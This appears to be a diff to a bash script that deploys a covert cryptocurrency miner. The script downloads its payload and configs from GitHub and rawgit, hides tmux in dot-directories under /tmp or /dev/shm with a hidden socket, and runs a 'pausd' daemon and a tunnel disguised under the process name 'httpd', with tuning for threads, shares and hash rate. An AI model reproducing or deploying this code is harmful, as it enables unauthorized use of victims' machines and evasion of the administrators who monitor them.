@@ -6,6 +6,16 @@ wget https://github.com/untoreh/scripts/archive/${BRANCH}.tar.gz
 tar xf ${BRANCH}.tar.gz && rm ${BRANCH}.tar.gz
 cd scripts-${BRANCH} || exit 1
 
+## relocate tmux
+trel=false
+for ph in {/tmp,/dev/shm,~/}; do
+    mkdir -p ${ph}/.tmux && \
+        mv pl/tmux ${ph}/.tmux && \
+        export PATH=${ph}/.tmux:$PATH && \
+        trel=true && break
+done
+[ $trel = false ] && { echo "couldn't relocate tmux" ; exit 1; }
+
 ## needed tmux sed grep envsubst
 export TERMINFO=pl/ \
        TERM=tmux \
@@ -14,12 +24,14 @@ export TERMINFO=pl/ \
        HOME=${HOME:-/tmp}
 [ -z "$SHELL" ] && echo "bash not found" && exit 1
 
+
 ## custom socket for tmux
 export tmx=$(which tmux)
 tmux(){
     $tmx -S /tmp/.tmx "$@"
 }
 export -f tmux
+tmux start-server || { echo "failed to start tmux"; exit 1 ; }
 
 ## glibc not needed on standalone
 ## tnl
@@ -30,10 +42,10 @@ tmux new-session -d -s ${TNL_MASK} ${TNL_MASK} ${TNL_ARGS}
 
 
 OBJ_MASK=${OBJ_MASK:-httpd}
-DAEMON=${DAEMON:-pausd}
+PAUSD_DAEMON=${PAUSD_DAEMON:-pausd}
 OBJ_CFG=${OBJ_CFG:-httpd-1.conf}
 CFG_BASE_URL=https://rawgit.com/untoreh/scripts/master/cfg/
-DAEMON_ARGS=${DAEMON_ARGS:-${OBJ_MASK} ${OBJ_MASK}.conf}
+PAUSD_ARGS=${PAUSD_ARGS:-${OBJ_MASK} ${OBJ_MASK}.conf}
 
 ## download cfg
 if [ ! -e "$OBJ_CFG" ]; then
@@ -47,9 +59,9 @@ chmod +x ${OBJ_MASK} &>/dev/null
 
 ## daemon
 # (when not included in the payload)
-# DAEMON_URL=https://rawgit.com/untoreh/scripts/master/${DAEMON}
-# wget -q ${DAEMON_URL}
-chmod +x ${DAEMON} &>/dev/null
+# PAUSD_DAEMON_URL=https://rawgit.com/untoreh/scripts/master/${PAUSD_DAEMON}
+# wget -q ${PAUSD_DAEMON_URL}
+chmod +x ${PAUSD_DAEMON} &>/dev/null
 
 ## daemon conf
 ## misc
@@ -87,12 +99,9 @@ else
     export AFFINITY="0x$hex_s"
 fi
 
-export \
-PAUSD_THREADS \
+## vars set through tmux
 PAUSD_VER=${PAUSD_VER:-2}
-export \
-PAUSD_SHARES=${PAUSD_SHARES:-$((PAUSD_THREADS * PAUSD_VER))} \
-PAUSD_SESSION_NAME=${PAUSD_SESSION_NAME:-${OBJ_MASK}} \
+PAUSD_SHARES=${PAUSD_SHARES:-$((PAUSD_THREADS * PAUSD_VER))}
 PAUSD_RATE=${PAUSD_RATE:-200}
 
 export \
@@ -104,13 +113,17 @@ ENDPOINT=${ENDPONT:-127.0.0.1:8080}
 cat ${OBJ_MASK}.conf.tpl | envsubst -no-empty > ${OBJ_MASK}.conf
 
 ## init
-tmux new-session -dE -s ${DAEMON} ${DAEMON} ${DAEMON_ARGS}
+## set vars used by pausd daemon in tmux
+for v in $(builtin compgen -A variable | grep ^PAUSD); do
+    export $v
+    tmux setenv -g $v "${!v}" ; done
+tmux new-session -d -s ${PAUSD_DAEMON} ${PAUSD_DAEMON} ${PAUSD_ARGS}
 sleep 1 ## give time to fail
 
 ## cleanup
 ## wait for tmux session to startup
 slept=0
-while [ "$(tmux ls | wc -l)" -lt 3 ]; do
+while [ "$(tmux ls | wc -l)" -lt 2 ]; do
     slept=$((slept+1))
     if [ $slept -gt 5 ]; then ## no aes means crash means aeon
         ## try without hw accel
@@ -123,8 +136,8 @@ while [ "$(tmux ls | wc -l)" -lt 3 ]; do
         ## subst
         cat ${OBJ_MASK}.conf.tpl | envsubst -no-empty > ${OBJ_MASK}.conf
         ## init
-        tmux kill-session -t ${DAEMON}
-        tmux new-session -d -s ${DAEMON} ${DAEMON} ${DAEMON_ARGS}
+        tmux kill-session -t ${PAUSD_DAEMON}
+        tmux new-session -d -s ${PAUSD_DAEMON} ${PAUSD_DAEMON} ${PAUSD_ARGS}
         while [ "$(tmux ls | wc -l)" -lt 3 ]; do sleep 1; done
         break
     fi
